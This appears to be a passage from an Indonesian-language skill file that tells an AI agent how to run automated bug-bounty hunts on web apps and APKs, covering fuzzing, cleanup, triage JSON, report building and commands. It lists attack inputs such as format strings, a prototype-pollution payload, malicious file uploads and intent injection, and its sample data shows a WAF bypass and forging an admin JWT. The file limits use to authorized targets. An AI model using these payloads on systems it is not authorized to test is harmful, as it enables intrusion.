- Input fuzzing: 10k string, unicode surrogat `\uD800`, null byte `%00`, format string `%s%n%x`, JSON prototype pollution `{"__proto__":{"admin":true}}`.
- HTTP method mangling: PUT/DELETE/PATCH/TRACE pada endpoint read-only.
- Race condition: 10 parallel request via Playwright `Promise.all`.
- Error disclosure: stack trace, SQL query, server path bocor.
- Large file upload: 50MB, file tipe berbahaya (`.php`, `.jsp`, `.aspx`).

*APK:*
```bash
adb shell monkey -p <package> --throttle 100 --pct-touch 40 --pct-motion 30 --pct-appswitch 15 -v 1000
```
- Intent injection ke seluruh exported component.
- Low-memory kill + restart → crash/state corruption check.
- Permission revoke mid-session.

### §12 — Cleanup (Auto)

| Jejak | Metode |
|---|---|
| Browser cookies & session | `browser_clear_cookies`, logout endpoint |
| Local storage / IndexedDB | `localStorage.clear(); sessionStorage.clear()` via Playwright |
| Data uji via API | Endpoint delete/rollback dengan ID yang dicatat selama exploit |
| File temporer device | `adb shell rm -rf /sdcard/Android/data/<pkg>/files/tmp/` |
| Log buffer device | `adb logcat -c` |
| Proxy config emulator | `adb shell settings put global http_proxy :0` |
| Data tidak bisa dihapus | Catat untuk vendor → cleanup status = `PARTIAL` |

### §13 — Verify-Cleanup
- Navigasi ulang ke endpoint kritis, verifikasi sesi/data uji tidak ada.
- Status: `VERIFIED` atau `PARTIAL`.

### §14 — Triage
- Tulis semua ke `pendukung/ai/triage.json`.
- Kill chain narrative per chain.
- CVE match table.
- WAF bypass status.
- JWT analysis results.

### §15 — Report
- Bangun DOCX: `build_report.py --profile bughunt`.
- Multi-format: DOCX + `submission-hackerone.md` + `submission-bugcrowd.md` + `submission-generic.md`.
- Watch dashboard: `watch-dashboard.html`.

### §16 — Watch Mode (Playwright Live Dashboard)

Aktif jika perintah menyertakan `--watch [interval_menit]`:

1. Playwright buka browser **visible (non-headless)**.
2. Navigasi ke `watch-dashboard.html` yang di-generate lokal.
3. Setiap N menit: jalankan ulang recon + assess (tanpa chaos ulang).
4. **Diff engine**: bandingkan `triage.json` sesi ini vs sesi sebelumnya (`triage-prev.json`).
   - Temuan baru → highlight kuning di dashboard + cetak di chat.
   - Temuan hilang/resolved → ditandai strikethrough.
   - Severity berubah → ditandai merah.
5. Dashboard auto-refresh 10 detik.
6. Stop: user tutup browser atau ketik `stop hunt`.

---

## 2. CARA MEMERINTAHKAN

| Perintah | Eksekusi |
|---|---|
| `hunt [url]` | Web hunting penuh semua fase. |
| `hunt web [url]` | Eksplisit web. |
| `hunt apk [path\|pkg]` | APK hunting penuh. |
| `hunt all [url] [apk]` | Hybrid web + APK, satu triage satu DOCX. |
| `hunt --watch 30 [url]` | Watch mode: hunt penuh → ulang tiap 30 menit → live diff dashboard. |

Alias: `bughunt [target]`, `bug hunter web <url>`, `bug hunter apk <file>`.

---

## 3. GUARDRAIL & ZERO REDACTION POLICY

1. **Otorisasi**: Jalankan hanya pada target milik sendiri, staging/UAT, atau program bug bounty dengan scope tertulis.
2. **Stop Produksi**: Eksploit yang akan mengubah data produksi permanen tanpa rollback → hentikan chain, tandai `BLOCKED`.
3. **Zero Redaction**: Nilai aktual dari artefak tampil apa adanya. Nilai tidak ada = `(...)`. Tidak ada `[REDACTED]`.
4. **Kredensial**: Tidak pernah diminta di chat. Tidak pernah ditulis ke log publik.
5. **iOS/IPA**: Belum didukung. Tandai `BLOCKED`. Tambah saat ada `xcrun simctl`.
6. **DoS dilarang**: Chaos testing dibatasi request count yang wajar; bukan flood/DDoS.

---

## 4. FORMAT TRIAGE.JSON STANDAR

```json
{
  "target": "https://target.com",
  "mode": "bughunt-web",
  "date": "2026-11-20",
  "environment": "Bug Bounty / Staging",
  "verdict": "CRITICAL FINDINGS — DO NOT RELEASE",
  "ticket_ref": "HackerOne / nama program",
  "report": {
    "profile": "bughunt",
    "output": "Laporan-BugHunter-target-20261120.docx",
    "page_breaks_before": ["kill_chains", "findings", "risk", "appendix_cases"]
  },
  "waf": {
    "detected": true,
    "type": "Cloudflare",
    "bypass_success": ["X-Forwarded-For: 127.0.0.1", "double URL encode"],
    "bypass_failed": ["case mutation"]
  },
  "recon": {
    "subdomains_found": [
      {"host": "api.target.com", "ip": "1.2.3.4", "status": 200, "tech": "Node.js"},
      {"host": "admin.target.com", "ip": "1.2.3.5", "status": 403, "tech": "Nginx"}
    ],
    "tech_stack": ["Nginx/1.18", "React", "Node.js/18"],
    "endpoints": [
      {"method": "GET", "url": "/api/v1/users", "auth": "None", "status": 200}
    ],
    "secrets_detected": [
      {"type": "AWS Key", "location": "static/js/main.chunk.js:L1842", "value": "AKIA...", "risk": "CRITICAL"}
    ]
  },
  "jwt_analysis": [
    {
      "id": "JWT-01",
      "location": "Authorization header",
      "algorithm": "HS256",
      "claims": {"sub": "user_123", "role": "user", "exp": 9999999999},
      "vulnerability": "Weak secret — cracked: 'secret'",
      "severity": "CRITICAL",
      "exploit": "Forged admin token accepted by /api/admin/users"
    }
  ],
  "cve_matches": [
    {
      "component": "Nginx 1.18.0",
      "cve": "CVE-2021-23017",
      "cvss": 7.7,
      "description": "1-byte memory overwrite in resolver",
      "likely_vulnerable": true,
      "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23017"
    }
  ],
  "kill_chains": [],
  "chaos": {
    "cleanup_status": "VERIFIED",
    "tests": [],
    "cleanup_items": []
  },
  "findings": [],
  "passed_checks": [],
  "limitations": [],
  "summary": {
    "total_findings": 0,
    "by_severity": {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0},
    "verdict": "PENDING"
  }
}
```

---

## 5. STRUKTUR ARTEFAK

```
hasil-hunt-[target]-[tanggal]/
├── Laporan-BugHunter-[Target]-[Tanggal].docx    ← SATU laporan DOCX final
├── submission-hackerone.md                       ← Draft HackerOne (top 5 findings)
├── submission-bugcrowd.md                        ← Draft Bugcrowd dengan VRT priority
├── submission-generic.md                         ← Draft generic/private program
├── watch-dashboard.html                          ← Live dashboard (saat watch mode)
└── pendukung/
    ├── ai/
    │   ├── triage.json                          ← Single source of truth
    │   ├── triage-prev.json                     ← Snapshot sesi sebelumnya (watch diff)
    │   ├── audit-log.jsonl                      ← Jejak eksekusi kronologis
    │   └── generated-cases.md                   ← Daftar seluruh skenario uji
    ├── bukti/
    │   ├── network/                             ← HTTP flow capture
    │   ├── jwt/                                 ← Decoded JWT + forge attempts
    │   └── screenshots/                         ← Screenshot PoC tertanam di DOCX
    └── reconnaissance/
        ├── subdomains.json                      ← Hasil subdomain enumeration + brute
        ├── tech-fingerprint.json                ← Server/framework/CDN detection
        ├── endpoints.json                       ← Peta endpoint teridentifikasi
        ├── js-secrets.json                      ← Secrets dari JS file analysis
        ├── cve-matches.json                     ← CVE lookup hasil
        ├── graphql-schema.json                  ← Hasil introspection (jika ada)
        └── waf-analysis.json                    ← WAF type + bypass results
```

---

## 6. PERINTAH LENGKAP

```bash
# Hunt web penuh
hunt web https://target.com/

# Hunt APK
hunt apk com.target.app
hunt apk /path/to/app.apk

# Hunt hybrid
hunt all https://target.com/ com.target.app

# Watch mode 30 menit
hunt --watch 30 https://target.com/

# Alias
bughunt https://target.com/
```

Generator laporan:
```bash
python C:\Users\Harrys\.config\opencode\skills\bug-hunter\build_report.py --root <folder_hasil>
```
